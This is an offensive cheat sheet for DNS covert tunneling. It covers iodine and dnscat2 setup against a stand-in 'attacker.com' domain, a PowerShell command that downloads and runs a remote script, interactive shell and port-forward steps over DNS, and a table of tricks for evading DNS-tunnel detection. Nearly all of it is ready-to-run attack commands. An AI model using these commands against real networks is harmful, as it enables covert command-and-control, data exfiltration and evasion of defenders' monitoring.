# DNS Covert Tunneling

Use when all outbound TCP/HTTP is blocked but DNS queries reach external resolvers.

## Prerequisites

- Control an external domain (e.g. `tunnel.attacker.com`)
- NS record for the tunnel subdomain pointing to attacker server
- Attacker server has public IP and UDP/53 open inbound

---

## iodine (IP-over-DNS — full IP tunnel)

```bash
# Attacker server (needs root, UDP 53)
sudo iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# -c: disable IP check (NAT-friendly)
# 10.0.0.1: tunnel server IP

# Pivot host (Linux)
sudo iodine -f -P password tunnel.attacker.com
# Creates dns0 interface with IP 10.0.0.2

# Pivot host (Windows) — use iodine Windows binary
iodine.exe -P password tunnel.attacker.com

# After tunnel up: SSH through tunnel interface
ssh -D 1080 root@10.0.0.1
# Then proxychains for full internal access
```

**Bandwidth**: ~1 Mbps depending on DNS resolver latency. Works through most corporate resolvers.

---

## dnscat2 (C2-over-DNS — command channel)

```bash
# Attacker server
gem install dnscat2
ruby dnscat2.rb --dns "domain=tunnel.attacker.com" --secret=mysecret

# Pivot host (Linux)
./dnscat2 --secret=mysecret tunnel.attacker.com

# Pivot host (Windows PowerShell)
IEX (New-Object Net.WebClient).DownloadString("http://attacker/dnscat2.ps1")
Start-Dnscat2 -Domain tunnel.attacker.com -PreSharedSecret mysecret

# In dnscat2 server console:
dnscat2> session -i 1
command session (windows/linux)> shell        # get interactive shell
command session> listen 0.0.0.0:1080 192.168.1.10:3389   # port forward
```

**Use case**: dnscat2 is better than iodine for C2; iodine is better for high-bandwidth pivoting.

---

## Detection Evasion Notes

| Technique | Indicator | Mitigation |
|-----------|-----------|------------|
| iodine | High-volume TXT/NULL/MX queries to single subdomain | Use `--type=A` to blend with normal A queries |
| dnscat2 | Encoded data in DNS query names, long subdomains | `--delay` flag to reduce query rate |
| Both | Queries to non-corporate resolver | Point NS to a recursive resolver that forwards to your server |

---

## DNS Tunnel via proxychains

```
# /etc/proxychains4.conf
strict_chain
proxy_dns          # IMPORTANT: route DNS through tunnel too
[ProxyList]
socks5  127.0.0.1  1080   # SSH dynamic forward over iodine interface
```
